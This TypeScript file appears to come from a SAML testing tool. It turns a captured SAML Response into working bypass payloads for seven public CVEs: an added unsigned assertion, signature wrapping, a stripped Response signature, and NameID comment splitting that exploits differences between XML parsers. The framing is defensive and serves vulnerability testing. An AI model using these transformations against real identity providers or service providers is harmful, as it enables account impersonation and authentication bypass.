import {
  SAML_ASSERTION_NS,
  SAML_PROTOCOL_NS,
  XML_SIGNATURE_NS,
} from "../namespaces";
import { parseXml, serializeXml } from "../xml";

import { isAbsent, type Maybe } from "@/utils";

export type CveId =
  | "CVE-2017-11428"
  | "CVE-2018-0489"
  | "CVE-2024-45409"
  | "CVE-2022-41912"
  | "CVE-2025-23369"
  | "CVE-2025-25291"
  | "CVE-2025-25292";

export type CveOutcome =
  | { kind: "Ok"; xml: string; description: string; effect: string }
  | { kind: "NotApplicable"; reason: string };

export type CvePreset = {
  id: CveId;
  label: string;
  product: string;
  summary: string;
  reference: string;
};

const readResponse = (document: Document): Maybe<Element> => {
  const root = document.documentElement;
  return root.namespaceURI === SAML_PROTOCOL_NS && root.localName === "Response"
    ? root
    : undefined;
};

const readAssertion = (response: Element): Maybe<Element> =>
  Array.from(response.children).find(
    (child) =>
      child.namespaceURI === SAML_ASSERTION_NS &&
      child.localName === "Assertion",
  );

const readNameId = (element: Element): Maybe<Element> =>
  Array.from(element.getElementsByTagNameNS(SAML_ASSERTION_NS, "NameID"))[0];

const readSubjectNameId = (response: Element): Maybe<Element> =>
  Array.from(response.getElementsByTagNameNS(SAML_ASSERTION_NS, "NameID")).find(
    (nameId) => isAbsent(readOwningAssertion(nameId)),
  );

const readOwningAssertion = (element: Element): Maybe<Element> => {
  let current: Maybe<Element> = element.parentElement;
  while (!isAbsent(current)) {
    if (
      current.namespaceURI === SAML_ASSERTION_NS &&
      current.localName === "Assertion"
    ) {
      return current;
    }
    current = current.parentElement;
  }
  return undefined;
};

const splitWithComment = (element: Element, comments: number): boolean => {
  const text = element.textContent ?? "";
  const at = text.indexOf("@");
  if (at <= 0) return false;

  const owner = element.ownerDocument;
  while (!isAbsent(element.firstChild)) element.removeChild(element.firstChild);
  element.appendChild(owner.createTextNode(text.slice(0, at)));
  for (let index = 0; index < comments; index += 1) {
    element.appendChild(owner.createComment(""));
  }
  element.appendChild(owner.createTextNode(text.slice(at)));
  return true;
};

export const CVE_PRESETS: ReadonlyArray<CvePreset> = [
  {
    id: "CVE-2017-11428",
    label: "NameID truncated by a comment",
    product:
      "ruby-saml before 1.6.0, and the same flaw in several other libraries",
    summary:
      "A comment inside the NameID makes a text-reading parser stop early, so the identity that is verified is not the identity that is used.",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2017-11428",
  },
  {
    id: "CVE-2018-0489",
    label: "Comment truncation, second form",
    product: "ruby-saml before 1.7.2",
    summary:
      "The fix for CVE-2017-11428 was incomplete: more than one comment in the same element reopened the truncation.",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2018-0489",
  },
  {
    id: "CVE-2024-45409",
    label: "Unsigned Response with a signed Assertion",
    product:
      "ruby-saml before 1.12.3 and 1.13.x before 1.17.0, as shipped by GitLab",
    summary:
      "Signature verification could be satisfied by a signature that did not cover the element being trusted, letting a forged response through.",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2024-45409",
  },
  {
    id: "CVE-2022-41912",
    label: "Extra unsigned assertion",
    product: "crewjam/saml before 0.4.9",
    summary:
      "The library validated one assertion and then accepted attributes from another, so a response carrying a second, unsigned assertion could impersonate any user.",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2022-41912",
  },
  {
    id: "CVE-2025-23369",
    label: "Signature wrapping in the Response",
    product: "GitHub Enterprise Server before 3.12.14",
    summary:
      "Improper verification of the XML signature let a crafted response move the signed element away from the one the product consumed, allowing SAML single sign-on to be bypassed.",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2025-23369",
  },
  {
    id: "CVE-2025-25291",
    label: "Parser differential in the NameID",
    product: "ruby-saml before 1.12.4 and 1.13.x before 1.18.0",
    summary:
      "REXML and Nokogiri read the same document differently, so a NameID split by a comment is verified as one value and consumed as another.",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2025-25291",
  },
  {
    id: "CVE-2025-25292",
    label: "Parser differential in the subject",
    product: "ruby-saml before 1.12.4 and 1.13.x before 1.18.0",
    summary:
      "The companion issue to CVE-2025-25291: the same parser disagreement applied to the signed Assertion identifier rather than the NameID.",
    reference: "https://nvd.nist.gov/vuln/detail/CVE-2025-25292",
  },
];

const buildOutcome = (
  clone: Document,
  description: string,
  effect: string,
): CveOutcome => {
  const xml = serializeXml(clone);
  if (parseXml(xml).kind !== "Ok") {
    return {
      kind: "NotApplicable",
      reason: "the preset produced XML that no longer parses",
    };
  }
  return { kind: "Ok", xml, description, effect };
};

export const applyCvePreset = (document: Document, id: CveId): CveOutcome => {
  const clone = document.cloneNode(true) as Document;
  const response = readResponse(clone);
  if (isAbsent(response)) {
    return {
      kind: "NotApplicable",
      reason: "this message is not a SAML Response",
    };
  }

  const assertion = readAssertion(response);
  if (isAbsent(assertion)) {
    return {
      kind: "NotApplicable",
      reason: "this Response carries no Assertion",
    };
  }

  if (id === "CVE-2022-41912") {
    const extra = assertion.cloneNode(true) as Element;
    for (const signature of Array.from(
      extra.getElementsByTagNameNS(XML_SIGNATURE_NS, "Signature"),
    )) {
      signature.parentElement?.removeChild(signature);
    }
    extra.setAttribute("ID", "_cve_2022_41912");
    response.appendChild(extra);

    return buildOutcome(
      clone,
      "Appended a second, unsigned Assertion after the signed one.",
      "A service provider that validates one Assertion but reads attributes from another accepts the unsigned copy. Seeing this accepted is the finding; the response being well formed proves nothing.",
    );
  }

  if (id === "CVE-2025-23369") {
    const signature = Array.from(response.children).find(
      (child) => child.localName === "Signature",
    );
    if (isAbsent(signature)) {
      return {
        kind: "NotApplicable",
        reason: "this preset needs a signature over the Response",
      };
    }

    const benign = response.cloneNode(true) as Element;
    const nested = Array.from(benign.children).find(
      (child) => child.localName === "Signature",
    );
    if (!isAbsent(nested)) benign.removeChild(nested);

    response.setAttribute("ID", "_cve_2025_23369");
    signature.appendChild(benign);

    return buildOutcome(
      clone,
      "Moved a signature-stripped copy of the signed Response inside its own Signature and renamed the outer Response.",
      "The signature still verifies over the nested copy while the outer Response is attacker controlled. A product that verifies one and consumes the other is bypassable.",
    );
  }

  if (id === "CVE-2024-45409") {
    const signature = Array.from(response.children).find(
      (child) => child.localName === "Signature",
    );
    if (isAbsent(signature)) {
      return {
        kind: "NotApplicable",
        reason: "this preset needs a signature over the Response to remove",
      };
    }

    response.removeChild(signature);

    return buildOutcome(
      clone,
      "Removed the Response signature, leaving only the Assertion signature behind.",
      "A service provider that believes the Response was signed because some signature verified is accepting a Response nobody signed. Acceptance is the finding.",
    );
  }

  const target =
    id === "CVE-2025-25292"
      ? readSubjectNameId(response)
      : readNameId(assertion);
  if (isAbsent(target)) {
    return {
      kind: "NotApplicable",
      reason:
        id === "CVE-2025-25292"
          ? "this Response carries no NameID outside the signed Assertion"
          : "this message carries no NameID",
    };
  }
  if (!splitWithComment(target, id === "CVE-2018-0489" ? 2 : 1)) {
    return {
      kind: "NotApplicable",
      reason:
        "the NameID has no @ to split on, so the differential cannot be built",
    };
  }

  return buildOutcome(
    clone,
    "Split the NameID text around an empty XML comment.",
    "Two XML parsers read this differently: one sees the whole address, the other stops at the comment. A product that verifies with one parser and reads the identity with the other can be given a different user than it signed for.",
  );
};
